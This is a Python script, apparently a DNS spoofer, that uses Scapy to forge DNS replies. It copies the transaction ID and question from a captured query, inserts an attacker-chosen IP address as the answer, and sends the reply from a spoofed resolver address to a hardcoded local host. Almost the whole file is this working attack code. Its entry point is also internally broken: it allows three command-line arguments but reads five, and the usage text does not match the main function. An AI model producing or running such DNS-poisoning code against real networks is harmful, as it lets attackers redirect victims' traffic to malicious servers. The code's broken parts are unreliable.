from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send
import sys

LOCALHOST_ADDR: str = "10.100.102.14"

def send_spoofed_dns_response_scapy(spoofed_src_ip, dst_port, transaction_id, query_buffer, resolved_ip):
    """
    Creates and sends a spoofed DNS response packet using Scapy.

    spoofed_src_ip (str): The spoofed source IP address.
    dst_port (int): The destination port to send the response to.
    transaction_id (bytes): The transaction ID from the DNS query.
    query_buffer (bytes): The raw buffer of the received DNS query.
    resolved_ip (str): The IP address to include in the DNS response.
    """
    try:
        # Parse the full query to preserve all structure
        dns_query_full = DNS(query_buffer)
        
        # Extract fields
        qname = dns_query_full.qd.qname
        qtype = dns_query_full.qd.qtype
        qclass = dns_query_full.qd.qclass

        # Build the spoofed response with the same question
        dns_response = DNS(
            id=transaction_id,
            qr=1, aa=1, ra=1,
            qd=dns_query_full.qd,  # reuse exact question
            qdcount=1, ancount=1, nscount=0, arcount=0
        )

        dns_answer = DNSRR(rrname=qname, type="A", rclass="IN", ttl=300, rdata=resolved_ip)

        packet = IP(src=spoofed_src_ip, dst=LOCALHOST_ADDR) / \
                 UDP(sport=53, dport=dst_port) / \
                 dns_response / dns_answer

        # Send the packet
        send(packet, verbose=False)
        print(f"Spoofed DNS response sent from {spoofed_src_ip}:53 to {LOCALHOST_ADDR}:{dst_port} with Transaction ID: {transaction_id}")

    except Exception as e:
        print(f"Scapy error: {e}")


def main(original_src_port, original_dst_ip, transaction_id, resolved_ip, data_path):
    # Read binary data
    with open(data_path, 'rb') as f:
        data = f.read()

    print(f"Metadata: src_port={original_src_port}, dst_ip={original_dst_ip}, txn_id={transaction_id}")
    print(f"Binary data length: {len(data)} bytes")

    send_spoofed_dns_response_scapy(original_dst_ip, original_src_port, transaction_id, data, resolved_ip)


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Usage: dnsSpoofer.py <meta_file> <data_file>")
        sys.exit(1)

    main(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5])
